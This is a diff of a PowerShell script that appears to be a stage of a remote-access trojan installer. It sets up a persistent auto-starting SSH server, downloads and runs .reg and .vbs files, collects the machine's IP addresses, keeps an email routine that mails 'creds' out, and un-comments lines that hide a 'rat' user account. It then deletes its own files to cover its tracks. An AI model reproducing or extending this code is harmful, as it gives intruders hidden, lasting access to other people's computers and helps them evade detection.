@@ -32,15 +32,13 @@ create_user -username $username -password $password
 # varaibles
 $temp_folder = random_string
 $temp_folder_path = "$env:temp\$temp_folder"
-$current_dir = Get-Location
-$user_name = "$env:UserName"
-$your_email = Get-Content email.txt
-$email_password = Get-Content password.txt
 $target_ip = (Get-NetIPAddress -AddressFamily IPv4).IPAddress -join ", "
 
-
-# Define email parameters
+# Email function
 '''
+$your_email = Get-Content email.txt
+$email_password = Get-Content password.txt
+
 $EmailFrom = $your_email 
 $EmailTo = $your_email 
 $Subject = "creds"
@@ -60,14 +58,14 @@ $MailMessage.Body = $Body
 $SMTPClient.Send($MailMessage)
 '''
 
-# goto temp, make working directory
+# go to temp, make working directory
 mkdir $temp_folder_path
 Set-Location $temp_folder_path
 
 # enabling persistent ssh
 # to do: enable file and printer sharing so we can ping the machine, default windows install does not have it
-
 # to do: check for ssh first?
+
 Add-WindowsCapability -Online -Name OpenSSH.Server~~~~0.0.1.0
 Start-Service sshd
 Set-Service -Name sshd -StartupType 'Automatic'
@@ -84,8 +82,8 @@ Invoke-WebRequest -Uri confirm-reg.vbs -OutFile "$vb_string.vbs"
 Invoke-Expression "./$reg_string.reg"; Invoke-Expression "./$vb_string.vbs"
 
 # hide rat user
-#Set-Location C:\Users
-#attrib +h +s +r rat
+Set-Location C:\Users
+attrib +h +s +r rat
 
 # self delete
 Set-Location $temp_folder_path
@@ -99,7 +97,6 @@ $output_file = Join-Path $temp_folder_path "output.txt"
 Set-Content -Path $output_file -Value $file_content -Encoding UTF8
 
 # Clean up files as before
-#Remove-Item $user_name
 Remove-Item email.txt
 Remove-Item password.txt
 Remove-Item stage2.ps1
